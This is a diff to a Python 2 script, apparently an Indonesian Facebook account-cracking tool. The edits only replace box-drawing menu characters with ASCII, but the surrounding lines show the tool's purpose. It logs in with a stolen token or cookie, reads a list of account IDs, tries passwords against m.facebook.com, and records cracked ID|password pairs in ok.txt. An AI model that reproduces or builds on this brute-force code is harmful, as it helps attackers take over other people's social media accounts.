@@ -435,11 +435,11 @@ def methode():
 def logs():
   banner()
   print("\033[0;96m----------------------------------------------------------------------")
-  print("\033[0;96m╔══\033[0;97m[ Pilih Metode Login ]")
-  print("\033[0;96m║")
-  print("\033[0;96m╠══\033[0;97m[1] Login With Token")
-  print("\033[0;96m╠══\033[0;97m[2] Login With Cookie")
-  print("\033[0;96m╚══\033[0;97m[0] Exit")
+  print("\033[0;96m|==\033[0;97m[ Pilih Metode Login ]")
+  print("\033[0;96m|")
+  print("\033[0;96m|==\033[0;97m[1] Login With Token")
+  print("\033[0;96m|==\033[0;97m[2] Login With Cookie")
+  print("\033[0;96m|==\033[0;97m[0] Exit")
   print("\033[0;96m----------------------------------------------------------------------")
   sek=raw_input("\033[0;97m   [] Input : ")
   if sek=="":
@@ -568,7 +568,7 @@ class crack1:
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\033[0;96m╠══\033[0;97m[] ID List File : ")
+							self.apk=raw_input("\033[0;96m|==\033[0;97m[] ID List File : ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -633,7 +633,7 @@ class crack1:
 				log=m_fb(fl.get("id"),
 					i,"https://m.facebook.com")
 				if log.get("status")=="success":
-					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+					print("\r   [OK]%s %s + %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
